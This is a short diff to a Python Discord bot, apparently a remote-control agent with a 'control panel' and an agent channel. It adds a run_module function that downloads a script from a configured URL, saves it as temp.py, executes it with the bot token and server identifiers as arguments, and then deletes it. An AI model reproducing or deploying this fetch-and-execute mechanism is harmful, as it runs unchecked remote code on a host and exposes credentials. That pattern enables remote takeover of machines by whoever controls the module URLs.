@@ -135,8 +135,50 @@ async def move_panel():
     await send_log("New control panel created")
 
 
-def run_modue():
-    pass
+async def run_module(name):
+    module = modules.get(name)
+
+    if not module:
+        print(f"Module not found: {name}")
+        return
+
+    path = Path("temp.py")
+
+    try:
+        response = await asyncio.to_thread(
+            requests.get,
+            module["url"],
+            timeout=30
+        )
+
+        response.raise_for_status()
+        path.write_bytes(response.content)
+
+        await asyncio.to_thread(
+            subprocess.run,
+            [
+                sys.executable,
+                str(path),
+                "--token",
+                TOKEN,
+                "--channel",
+                str(agent_channel.id),
+                "--server",
+                str(GUILD_ID),
+            ],
+            check=True
+        )
+
+    except requests.RequestException as error:
+        print(f"Module download failed: {error}")
+
+    except subprocess.CalledProcessError as error:
+        print(f"Module exited with code {error.returncode}")
+
+    finally:
+        path.unlink(missing_ok=True)
+
+
 
 class ModuleView(discord.ui.View):
 
